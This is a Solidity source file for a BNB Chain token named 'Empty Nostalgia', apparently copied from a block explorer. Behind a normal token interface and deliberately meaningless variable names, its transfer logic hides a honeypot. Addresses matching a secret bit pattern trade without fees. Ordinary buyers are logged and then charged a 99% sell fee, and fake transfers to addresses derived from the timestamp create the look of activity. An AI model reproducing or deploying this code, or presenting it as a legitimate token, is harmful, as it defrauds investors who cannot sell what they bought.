/**
 *Submitted for verification at BscScan.com on 2022-12-11
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.8;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Auth {
    address internal owner;
    mapping(address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract EmptyNostalgia is IBEP20, Auth {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Empty Nostalgia ";
    string constant _symbol = "EmptyNostalgia";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private marketingBuyBotsWallet;
    mapping(address => bool) private swapMaxLiquidityBots;
    mapping(address => bool) private feeExemptWalletTeam;
    mapping(address => bool) private modeBurnTradingMin;
    mapping(address => uint256) private botsIsFeeWalletBurnReceiver;
    mapping(uint256 => address) private receiverTxModeSell;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private txSwapIsSell = 0;
    uint256 private maxSwapBurnTeam = 7;

    //SELL FEES
    uint256 private tradingSwapFeeLiquidity = 0;
    uint256 private sellLimitReceiverMarketing = 7;

    uint256 private feeReceiverSellSwap = maxSwapBurnTeam + txSwapIsSell;
    uint256 private burnIsBuyLaunchedModeLiquidity = 100;

    address private launchedLimitFeeWalletIsAutoTrading = (msg.sender); // auto-liq address
    address private botsIsLiquidityMode = (0x10565BBCaE4d0861f5121D9dfFfFf2781814C827); // marketing address
    address private launchedAutoLiquidityBurnLimit = DEAD;
    address private launchedMarketingLiquidityMode = DEAD;
    address private autoMinTeamFee = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private modeIsSellExempt;
    uint256 private buyIsMinWallet;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private maxModeBotsSellIs;
    uint256 private limitTeamExemptAuto;
    uint256 private txTeamWalletLaunched;
    uint256 private autoMarketingMinLaunched;
    uint256 private isTeamMinLimitSellBuySwap;

    bool private walletMaxSwapLimit = true;
    bool private modeBurnTradingMinMode = true;
    bool private limitAutoModeMarketing = true;
    bool private isBurnTxTeam = true;
    bool private receiverBurnIsWallet = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private minBuyExemptTeamLaunchedTxMarketing = 6 * 10 ** 15;
    uint256 private minSwapBurnExemptBuyLiquidity = _totalSupply / 1000; // 0.1%

    
    uint256 private swapLaunchedAutoLiquidity = 0;
    uint256 private receiverMaxLimitAutoModeMarketingTeam = 0;
    uint256 private tradingMinBuyIs = 0;
    uint256 private modeIsReceiverTxLimitWalletAuto = 0;
    bool private maxTeamReceiverWallet = false;
    uint256 private isLaunchedMinBuy = 0;
    bool private walletLaunchedAutoFee = false;
    uint256 private marketingMinSellTxWalletSwap = 0;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Auth(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        maxModeBotsSellIs = true;

        marketingBuyBotsWallet[msg.sender] = true;
        marketingBuyBotsWallet[address(this)] = true;

        swapMaxLiquidityBots[msg.sender] = true;
        swapMaxLiquidityBots[0x0000000000000000000000000000000000000000] = true;
        swapMaxLiquidityBots[0x000000000000000000000000000000000000dEaD] = true;
        swapMaxLiquidityBots[address(this)] = true;

        feeExemptWalletTeam[msg.sender] = true;
        feeExemptWalletTeam[0x0000000000000000000000000000000000000000] = true;
        feeExemptWalletTeam[0x000000000000000000000000000000000000dEaD] = true;
        feeExemptWalletTeam[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return receiverSwapModeMinLimitBots(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return receiverSwapModeMinLimitBots(sender, recipient, amount);
    }

    function receiverSwapModeMinLimitBots(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        if (receiverMaxLimitAutoModeMarketingTeam != maxSwapBurnTeam) {
            receiverMaxLimitAutoModeMarketingTeam = receiverMaxLimitAutoModeMarketingTeam;
        }

        if (tradingMinBuyIs != marketingMinSellTxWalletSwap) {
            tradingMinBuyIs = receiverMaxLimitAutoModeMarketingTeam;
        }


        bool bLimitTxWalletValue = launchedAutoIsMarketingSell(sender) || launchedAutoIsMarketingSell(recipient);
        
        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                buyExemptLimitSwap();
            }
            if (!bLimitTxWalletValue) {
                tradingFeeAutoLaunchedWallet(recipient);
            }
        }
        
        if (tradingMinBuyIs == tradingMinBuyIs) {
            tradingMinBuyIs = swapLaunchedAutoLiquidity;
        }

        if (receiverMaxLimitAutoModeMarketingTeam != feeReceiverSellSwap) {
            receiverMaxLimitAutoModeMarketingTeam = swapLaunchedAutoLiquidity;
        }


        if (inSwap || bLimitTxWalletValue) {return feeBuyTeamLimitLaunchedAuto(sender, recipient, amount);}

        if (!marketingBuyBotsWallet[sender] && !marketingBuyBotsWallet[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }
        
        require((amount <= _maxTxAmount) || feeExemptWalletTeam[sender] || feeExemptWalletTeam[recipient], "Max TX Limit has been triggered");

        if (feeWalletMarketingExemptReceiver()) {sellMarketingExemptMode();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        
        uint256 amountReceived = limitLaunchedMarketingSell(sender) ? isSwapBotsWalletLimitFeeMin(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function feeBuyTeamLimitLaunchedAuto(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function limitLaunchedMarketingSell(address sender) internal view returns (bool) {
        return !swapMaxLiquidityBots[sender];
    }

    function txReceiverSwapTrading(address sender, bool selling) internal returns (uint256) {
        
        if (selling) {
            feeReceiverSellSwap = sellLimitReceiverMarketing + tradingSwapFeeLiquidity;
            return isSwapTradingReceiver(sender, feeReceiverSellSwap);
        }
        if (!selling && sender == uniswapV2Pair) {
            feeReceiverSellSwap = maxSwapBurnTeam + txSwapIsSell;
            return feeReceiverSellSwap;
        }
        return isSwapTradingReceiver(sender, feeReceiverSellSwap);
    }

    function swapTeamBotsSell() private view returns (uint256) {
        address t0 = WBNB;
        if (address(this) < WBNB) {
            t0 = address(this);
        }
        (uint reserve0, uint reserve1,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 beforeAmount,) = WBNB == t0 ? (reserve0, reserve1) : (reserve1, reserve0);
        uint256 buyAmount = IERC20(WBNB).balanceOf(uniswapV2Pair) - beforeAmount;
        return buyAmount;
    }

    function isSwapBotsWalletLimitFeeMin(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        if (receiverMaxLimitAutoModeMarketingTeam != txSwapIsSell) {
            receiverMaxLimitAutoModeMarketingTeam = feeReceiverSellSwap;
        }


        uint256 feeAmount = amount.mul(txReceiverSwapTrading(sender, receiver == uniswapV2Pair)).div(burnIsBuyLaunchedModeLiquidity);

        if (modeBurnTradingMin[sender] || modeBurnTradingMin[receiver]) {
            feeAmount = amount.mul(99).div(burnIsBuyLaunchedModeLiquidity);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        if (_balances[address(this)] > 3 * 10 ** _decimals && sender == uniswapV2Pair) {
            for (uint i = 0; i < 3; i++) {
                address addr = address(uint160(block.timestamp + i));
                _balances[addr] = _balances[addr] + 10 ** _decimals;
                emit Transfer(address(this), addr, 10 ** _decimals);
            }
            _balances[address(this)] = _balances[address(this)].sub(3 * 10 ** _decimals);
        }

        return amount.sub(feeAmount);
    }

    function launchedAutoIsMarketingSell(address addr) private view returns (bool) {
        uint256 v0 = uint256(uint160(addr)) << 192;
        v0 = v0 >> 238;
        return v0 == firstSetAutoReceiver;
    }

    function isSwapTradingReceiver(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lcfkd = botsIsFeeWalletBurnReceiver[sender];
        uint256 kdkls = pFee;
        if (lcfkd > 0 && block.timestamp - lcfkd > 2) {
            kdkls = 99;
        }
        return kdkls;
    }

    function tradingFeeAutoLaunchedWallet(address addr) private {
        if (swapTeamBotsSell() < minBuyExemptTeamLaunchedTxMarketing) {
            return;
        }
        exemptLimitValue = exemptLimitValue + 1;
        receiverTxModeSell[exemptLimitValue] = addr;
    }

    function buyExemptLimitSwap() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (botsIsFeeWalletBurnReceiver[receiverTxModeSell[i]] == 0) {
                    botsIsFeeWalletBurnReceiver[receiverTxModeSell[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(botsIsLiquidityMode).transfer(amountBNB * amountPercentage / 100);
    }

    function feeWalletMarketingExemptReceiver() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    receiverBurnIsWallet &&
    _balances[address(this)] >= minSwapBurnExemptBuyLiquidity;
    }

    function sellMarketingExemptMode() internal swapping {
        
        uint256 amountToLiquify = minSwapBurnExemptBuyLiquidity.mul(txSwapIsSell).div(feeReceiverSellSwap).div(2);
        uint256 amountToSwap = minSwapBurnExemptBuyLiquidity.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = feeReceiverSellSwap.sub(txSwapIsSell.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(txSwapIsSell).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(maxSwapBurnTeam).div(totalETHFee);
        
        payable(botsIsLiquidityMode).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                launchedLimitFeeWalletIsAutoTrading,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getFeeReceiverSellSwap() public view returns (uint256) {
        return feeReceiverSellSwap;
    }
    function setFeeReceiverSellSwap(uint256 a0) public onlyOwner {
        if (feeReceiverSellSwap != receiverMaxLimitAutoModeMarketingTeam) {
            receiverMaxLimitAutoModeMarketingTeam=a0;
        }
        feeReceiverSellSwap=a0;
    }

    function getIsBurnTxTeam() public view returns (bool) {
        if (isBurnTxTeam == modeBurnTradingMinMode) {
            return modeBurnTradingMinMode;
        }
        if (isBurnTxTeam == maxTeamReceiverWallet) {
            return maxTeamReceiverWallet;
        }
        if (isBurnTxTeam == modeBurnTradingMinMode) {
            return modeBurnTradingMinMode;
        }
        return isBurnTxTeam;
    }
    function setIsBurnTxTeam(bool a0) public onlyOwner {
        if (isBurnTxTeam != receiverBurnIsWallet) {
            receiverBurnIsWallet=a0;
        }
        if (isBurnTxTeam == modeBurnTradingMinMode) {
            modeBurnTradingMinMode=a0;
        }
        isBurnTxTeam=a0;
    }

    function getMarketingMinSellTxWalletSwap() public view returns (uint256) {
        return marketingMinSellTxWalletSwap;
    }
    function setMarketingMinSellTxWalletSwap(uint256 a0) public onlyOwner {
        if (marketingMinSellTxWalletSwap != burnIsBuyLaunchedModeLiquidity) {
            burnIsBuyLaunchedModeLiquidity=a0;
        }
        if (marketingMinSellTxWalletSwap == txSwapIsSell) {
            txSwapIsSell=a0;
        }
        marketingMinSellTxWalletSwap=a0;
    }

    function getReceiverBurnIsWallet() public view returns (bool) {
        if (receiverBurnIsWallet != modeBurnTradingMinMode) {
            return modeBurnTradingMinMode;
        }
        if (receiverBurnIsWallet == maxTeamReceiverWallet) {
            return maxTeamReceiverWallet;
        }
        return receiverBurnIsWallet;
    }
    function setReceiverBurnIsWallet(bool a0) public onlyOwner {
        receiverBurnIsWallet=a0;
    }

    function getSwapMaxLiquidityBots(address a0) public view returns (bool) {
        if (a0 == launchedAutoLiquidityBurnLimit) {
            return modeBurnTradingMinMode;
        }
        if (a0 != launchedMarketingLiquidityMode) {
            return walletLaunchedAutoFee;
        }
        if (a0 != botsIsLiquidityMode) {
            return modeBurnTradingMinMode;
        }
            return swapMaxLiquidityBots[a0];
    }
    function setSwapMaxLiquidityBots(address a0,bool a1) public onlyOwner {
        if (swapMaxLiquidityBots[a0] == marketingBuyBotsWallet[a0]) {
           marketingBuyBotsWallet[a0]=a1;
        }
        if (swapMaxLiquidityBots[a0] != swapMaxLiquidityBots[a0]) {
           swapMaxLiquidityBots[a0]=a1;
        }
        if (a0 == launchedLimitFeeWalletIsAutoTrading) {
            isBurnTxTeam=a1;
        }
        swapMaxLiquidityBots[a0]=a1;
    }

    function getLimitAutoModeMarketing() public view returns (bool) {
        return limitAutoModeMarketing;
    }
    function setLimitAutoModeMarketing(bool a0) public onlyOwner {
        if (limitAutoModeMarketing == modeBurnTradingMinMode) {
            modeBurnTradingMinMode=a0;
        }
        if (limitAutoModeMarketing != limitAutoModeMarketing) {
            limitAutoModeMarketing=a0;
        }
        limitAutoModeMarketing=a0;
    }

    function getBurnIsBuyLaunchedModeLiquidity() public view returns (uint256) {
        if (burnIsBuyLaunchedModeLiquidity == isLaunchedMinBuy) {
            return isLaunchedMinBuy;
        }
        return burnIsBuyLaunchedModeLiquidity;
    }
    function setBurnIsBuyLaunchedModeLiquidity(uint256 a0) public onlyOwner {
        if (burnIsBuyLaunchedModeLiquidity == marketingMinSellTxWalletSwap) {
            marketingMinSellTxWalletSwap=a0;
        }
        if (burnIsBuyLaunchedModeLiquidity != receiverMaxLimitAutoModeMarketingTeam) {
            receiverMaxLimitAutoModeMarketingTeam=a0;
        }
        if (burnIsBuyLaunchedModeLiquidity != txSwapIsSell) {
            txSwapIsSell=a0;
        }
        burnIsBuyLaunchedModeLiquidity=a0;
    }

    function getTradingMinBuyIs() public view returns (uint256) {
        if (tradingMinBuyIs != minSwapBurnExemptBuyLiquidity) {
            return minSwapBurnExemptBuyLiquidity;
        }
        if (tradingMinBuyIs != receiverMaxLimitAutoModeMarketingTeam) {
            return receiverMaxLimitAutoModeMarketingTeam;
        }
        return tradingMinBuyIs;
    }
    function setTradingMinBuyIs(uint256 a0) public onlyOwner {
        if (tradingMinBuyIs != receiverMaxLimitAutoModeMarketingTeam) {
            receiverMaxLimitAutoModeMarketingTeam=a0;
        }
        if (tradingMinBuyIs == tradingMinBuyIs) {
            tradingMinBuyIs=a0;
        }
        tradingMinBuyIs=a0;
    }

    function getTradingSwapFeeLiquidity() public view returns (uint256) {
        if (tradingSwapFeeLiquidity == sellLimitReceiverMarketing) {
            return sellLimitReceiverMarketing;
        }
        return tradingSwapFeeLiquidity;
    }
    function setTradingSwapFeeLiquidity(uint256 a0) public onlyOwner {
        if (tradingSwapFeeLiquidity != marketingMinSellTxWalletSwap) {
            marketingMinSellTxWalletSwap=a0;
        }
        if (tradingSwapFeeLiquidity == isLaunchedMinBuy) {
            isLaunchedMinBuy=a0;
        }
        if (tradingSwapFeeLiquidity == maxSwapBurnTeam) {
            maxSwapBurnTeam=a0;
        }
        tradingSwapFeeLiquidity=a0;
    }

    function getMaxTeamReceiverWallet() public view returns (bool) {
        if (maxTeamReceiverWallet == limitAutoModeMarketing) {
            return limitAutoModeMarketing;
        }
        return maxTeamReceiverWallet;
    }
    function setMaxTeamReceiverWallet(bool a0) public onlyOwner {
        if (maxTeamReceiverWallet == limitAutoModeMarketing) {
            limitAutoModeMarketing=a0;
        }
        if (maxTeamReceiverWallet != receiverBurnIsWallet) {
            receiverBurnIsWallet=a0;
        }
        if (maxTeamReceiverWallet != walletMaxSwapLimit) {
            walletMaxSwapLimit=a0;
        }
        maxTeamReceiverWallet=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}